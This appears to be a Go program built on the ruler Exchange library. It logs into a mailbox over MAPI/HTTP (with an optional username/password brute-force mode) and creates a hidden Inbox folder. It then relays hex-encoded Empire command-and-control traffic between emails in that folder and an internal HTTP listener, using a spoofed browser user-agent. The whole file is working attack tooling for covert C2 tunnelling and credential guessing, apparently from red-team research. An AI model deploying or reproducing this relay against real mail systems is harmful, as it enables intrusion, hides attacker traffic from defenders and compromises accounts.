package main

import (
	"bytes"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/sensepost/ruler/autodiscover"
	"github.com/sensepost/ruler/mapi"
	"github.com/sensepost/ruler/utils"
)

//globals
var config utils.Config
var seen [][]byte
var folderid []byte

//doRequest to a target domain
func exit(err error) {
	//we had an error and we don't have a MAPI session
	if err != nil {
		fmt.Println(err)
		os.Exit(-1)
	}
	//let's disconnect from the MAPI session
	exitcode, err := mapi.Disconnect()
	if err != nil {
		fmt.Println(err)
	}
	os.Exit(exitcode)
}

func getMapiHTTP(autoURLPtr string) *utils.AutodiscoverResp {
	var resp *utils.AutodiscoverResp
	var err error
	fmt.Println("[*] Retrieving MAPI/HTTP info")
	if autoURLPtr == "" {
		resp, err = autodiscover.MAPIDiscover(config.Domain)
	} else {
		resp, err = autodiscover.MAPIDiscover(autoURLPtr)
	}

	if resp == nil || err != nil {
		exit(fmt.Errorf("[x] The autodiscover service request did not complete.\n%s", err))
	}
	//check if the autodiscover service responded with an error
	if resp.Response.Error != (utils.AutoError{}) {
		exit(fmt.Errorf("[x] The autodiscover service responded with an error.\n%s", resp.Response.Error.Message))
	}
	return resp
}

func main() {
	domainPtr := flag.String("domain", "", "The target domain (usually the email address domain)")

	userPtr := flag.String("user", "", "A valid username")
	passPtr := flag.String("pass", "", "A valid password")
	emailPtr := flag.String("email", "", "The target email address, used to select correct mailbox")
	autoURLPtr := flag.String("url", "", "If you know the Autodiscover URL, supply it here. Default behaviour is to try and find it via the domain")
	basicPtr := flag.Bool("basic", false, "Don't try NTLM, just do straight Basic")
	insecurePtr := flag.Bool("insecure", false, "Don't verify SSL/TLS cerificate")
	brutePtr := flag.Bool("brute", false, "Try bruteforce usernames/passwords")
	stopSuccessPtr := flag.Bool("stop", false, "Stop on successfully finding a username/password")
	userList := flag.String("usernames", "", "Filename for a List of usernames")
	passList := flag.String("passwords", "", "Filename for a List of passwords")
	verbosePtr := flag.Bool("v", false, "Be verbose, show failures")
	conscPtr := flag.Int("attempts", 2, "Number of attempts before delay")
	delayPtr := flag.Int("delay", 5, "Delay between attempts")

	flag.Parse()

	if *domainPtr == "" && *autoURLPtr == "" {
		exit(fmt.Errorf("[x] Domain required or autodiscover URL required"))
	}

	if *brutePtr == true {
		fmt.Println("[*] Starting bruteforce")
		autodiscover.BruteForce(*domainPtr, *userList, *passList, *basicPtr, *insecurePtr, *stopSuccessPtr, *verbosePtr, *conscPtr, *delayPtr)
		return
	}

	config.Domain = *domainPtr
	config.User = *userPtr
	config.Pass = *passPtr
	config.Email = *emailPtr
	config.Basic = *basicPtr
	config.Insecure = *insecurePtr
	config.Verbose = *verbosePtr

	autodiscover.SessionConfig = &config

	var resp *utils.AutodiscoverResp
	var err error

	var mapiURL, abkURL, userDN string

	resp = getMapiHTTP(*autoURLPtr)
	mapiURL = mapi.ExtractMapiURL(resp)
	abkURL = mapi.ExtractMapiAddressBookURL(resp)
	userDN = resp.Response.User.LegacyDN
	if mapiURL == "" {
		exit(fmt.Errorf("[x] No MAPI URL found. Exiting"))
	}

	fmt.Println("[+] MAPI URL found: ", mapiURL)
	fmt.Println("[+] MAPI AddressBook URL found: ", abkURL)

	mapi.Init(config, userDN, mapiURL, abkURL, mapi.HTTP)

	logon, err := mapi.Authenticate()
	if err != nil {
		exit(err)
	} else if logon.MailboxGUID != nil {
		fmt.Println("[*] And we are authenticated")
		fmt.Printf("[+] Mailbox GUID: %x\n", logon.MailboxGUID)
		fmt.Println("[*] Openning the Inbox")

		propertyTags := make([]mapi.PropertyTag, 2)
		propertyTags[0] = mapi.PidTagDisplayName
		propertyTags[1] = mapi.PidTagSubfolders

		rows, er := mapi.GetSubFolders(mapi.AuthSession.Folderids[mapi.INBOX])
		if er != nil {
			fmt.Println("[*] No Subfolders, so create our hidden folder")
			mapi.GetFolder(mapi.INBOX, propertyTags)
			r, err := mapi.CreateFolder("tunnelmeszs", true)
			if err != nil {
				return
			}
			folderid = r.FolderID
		} else {

			for k := 0; k < len(rows.RowData); k++ {
				fmt.Printf("Folder [%s] : %x \n", rows.RowData[k][0].ValueArray, rows.RowData[k][1].ValueArray)
				//convert string from unicode and then check if it is our target folder
				if fromUnicode(rows.RowData[k][0].ValueArray) == "tunnelmeszs" {
					folderid = rows.RowData[k][1].ValueArray
				}
			}
			if len(folderid) == 0 {
				fmt.Println("[*] Can't find our folder, so create our hidden folder")
				mapi.GetFolder(mapi.INBOX, propertyTags)
				r, err := mapi.CreateFolder("tunnelmeszs", true)
				if err != nil {
					return
				}
				folderid = r.FolderID
			}
		}
		fmt.Printf("Folderid: %x\n", folderid)

		for {
			//get stage 1 from client and forward to Empire
			rpc := getMessage(folderid)
			if rpc != "" {
				//post to client
				sendMessage(folderid, rpc)
			}
		}
		//time.Sleep(time.Second * 60)
		//get stage 2 from client and forward to Empire
		/*
			for k := 0; k < 2; k++ {
				rpc = getMessage(folderid)
				//post to client
				sendMessage(folderid, rpc)

			}
		*/
	}
}

func sendMessage(folderid []byte, rpc string) {

	propertyTagx := make([]mapi.TaggedPropertyValue, 8)

	propertyTagx[0] = mapi.TaggedPropertyValue{mapi.PidTagBody, mapi.UniString(rpc)}
	propertyTagx[6] = mapi.TaggedPropertyValue{mapi.PidTagSubject, mapi.UniString("mailpirein")}
	propertyTagx[7] = mapi.TaggedPropertyValue{mapi.PidTagNormalizedSubject, mapi.UniString("mailpirein")}

	propertyTagx[1] = mapi.TaggedPropertyValue{mapi.PropertyTag{mapi.PtypString, 0x001A}, mapi.UniString("IPM.Note")}
	propertyTagx[2] = mapi.TaggedPropertyValue{mapi.PidTagConversationTopic, mapi.UniString("mailpirein")}
	propertyTagx[3] = mapi.PidTagIconIndex
	propertyTagx[4] = mapi.PidTagMessageEditorFormat
	propertyTagx[5] = mapi.TaggedPropertyValue{mapi.PidTagNativeBody, []byte{0x00, 0x00, 0x00, 0x01}}
	var split int = 9972 //must be multiple of 3, otherwise we get the - at end of line
	if len(rpc) > split {

		piecescnt := len(rpc) / split
		index := 0

		var rrpc string

		for kk := 0; kk < piecescnt; kk++ {
			if index+split < len(rpc) {
				rrpc = rpc[index : index+split]
				if rrpc[len(rrpc)-1:] == "-" {
					rrpc = rrpc[:len(rrpc)-1]
				}

				index += split

				if kk == 0 {
					propertyTagx[6] = mapi.TaggedPropertyValue{mapi.PidTagSubject, mapi.UniString(fmt.Sprintf("mailpirein-b%d", piecescnt))}
					propertyTagx[7] = mapi.TaggedPropertyValue{mapi.PidTagNormalizedSubject, mapi.UniString(fmt.Sprintf("mailpirein-b%d", piecescnt))}

				} else {
					propertyTagx[6] = mapi.TaggedPropertyValue{mapi.PidTagSubject, mapi.UniString(fmt.Sprintf("mailpirein-%d", kk))}
					propertyTagx[7] = mapi.TaggedPropertyValue{mapi.PidTagNormalizedSubject, mapi.UniString(fmt.Sprintf("mailpirein-%d", kk))}
				}
			}

			propertyTagx[0] = mapi.TaggedPropertyValue{mapi.PidTagBody, mapi.UniString(rrpc)}

			_, er := mapi.CreateMessage(folderid, propertyTagx)
			if er != nil {
				exit(er)
			}
		}
		if len(rpc) > split*piecescnt {
			rrpc = rpc[index:]
			propertyTagx[0] = mapi.TaggedPropertyValue{mapi.PidTagBody, mapi.UniString(rrpc + "\n\r")}
			propertyTagx[6] = mapi.TaggedPropertyValue{mapi.PidTagSubject, mapi.UniString("mailpirein-s")}
			propertyTagx[7] = mapi.TaggedPropertyValue{mapi.PidTagNormalizedSubject, mapi.UniString("mailpirein-s")}
			_, er := mapi.CreateMessage(folderid, propertyTagx)

			if er != nil {
				exit(er)
			}
		}

	} else {
		_, er := mapi.CreateMessage(folderid, propertyTagx)

		if er != nil {
			exit(er)
		}
	}
	//fmt.Println(res.MessageID)
}

func getMessage(folderid []byte) string {
	rpc := ""
	stop := false
	for {
		rows, err := mapi.GetContents(folderid)
		if err != nil {
			fmt.Println("error: ", err)
			time.Sleep(time.Second * (time.Duration)(5))
			continue
		}
		if rows == nil {
			mapi.ReleaseObject(0x01)
			mapi.GetFolder(mapi.INBOX, nil)
			continue
		}
		if rows != nil {

			if rows.RowCount == 0 {
				time.Sleep(time.Second * (time.Duration)(5))
				continue
			}
			for k := 0; k < len(rows.RowData); k++ {
				x := fromUnicode(rows.RowData[k][0].ValueArray)
				messageid := rows.RowData[k][1].ValueArray

				if x == "mailpireout" {
					//fetch full message
					cols := make([]mapi.PropertyTag, 1)
					//cols[1] = mapi.PidTagSubject
					cols[0] = mapi.PidTagBody //Html

					buff, err := mapi.GetMessageFast(folderid, messageid, cols)
					if err != nil {
						fmt.Println(err)
					}
					//convert buffer to rows
					messagerows := mapi.DecodeBufferToRows(buff.TransferBuffer, cols)

					stop = false
					payload := fromUnicode(messagerows[0].ValueArray[:len(messagerows[0].ValueArray)-4])

					if payload == "" {
						continue
					}
					//we also need to mark the message for deletion
					_, err = mapi.DeleteMessages(folderid, 1, messageid)
					if err != nil {
						fmt.Println(err)
					}

					client := &http.Client{}
					var req *http.Request

					if string(payload[0:5]) == "POST " {
						pp := toBytes(payload[7:])

						req, _ = http.NewRequest("POST", "http://172.17.0.2:80/index.jsp", bytes.NewBuffer(pp))
						req.Header.Add("Content-Type", "application/binary")
						req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
						//resp, err := http.Post("http://172.17.0.2:80/index.jsp", "application/binary", strings.NewReader(payload))
					} else if string(payload[0:3]) == "GET" {
						pi := strings.Split(payload, "-")
						uri := pi[2]
						c := &http.Cookie{Name: "session", Value: pi[1], HttpOnly: false}
						req, _ = http.NewRequest("GET", "http://172.17.0.2:80/"+uri, nil)
						req.Header.Add("Content-Type", "application/binary")
						req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
						req.AddCookie(c)
					} else if string(payload[0:5]) == "POSTM" {
						pi := strings.Split(payload, "-")
						uri := pi[1]
						c := &http.Cookie{Name: "session", Value: pi[1], HttpOnly: false}
						lenn := len(pi[0]) + len(pi[1]) + 3
						pp := toBytes(payload[lenn:])
						req, _ = http.NewRequest("POST", "http://172.17.0.2:80/"+uri, bytes.NewBuffer(pp))
						req.Header.Add("Content-Type", "application/binary")
						req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
						req.AddCookie(c)
					}
					resp, err := client.Do(req)
					defer resp.Body.Close()
					if err != nil {
						return ""
					}
					body, err := ioutil.ReadAll(resp.Body)
					if err != nil {
						return ""
					}
					stop = true
					if string(payload[0:5]) == "POSTM" {
						return ""
					}
					rpc = encodeToHex(body)

					return rpc
				} else if rows.RowCount == 1 {
					time.Sleep(time.Second * (time.Duration)(5))
				}
			}
		}
		if stop == true {
			break
		}
	}
	return rpc
}
func toBytes(input string) []byte {
	parts := strings.Replace(input, "-", "", -1)
	k, _ := hex.DecodeString(parts)
	return k
}

func encodeToHex(input []byte) string {
	str := ""
	for k, v := range input {
		str += hex.EncodeToString([]byte{v})
		if k < len(input)-1 {
			str += "-"
		}
	}
	return str
}
func fromUnicode(uni []byte) string {
	st := ""
	for _, k := range uni {
		if k != 0x00 {
			st += string(k)
		}
	}
	return st
}
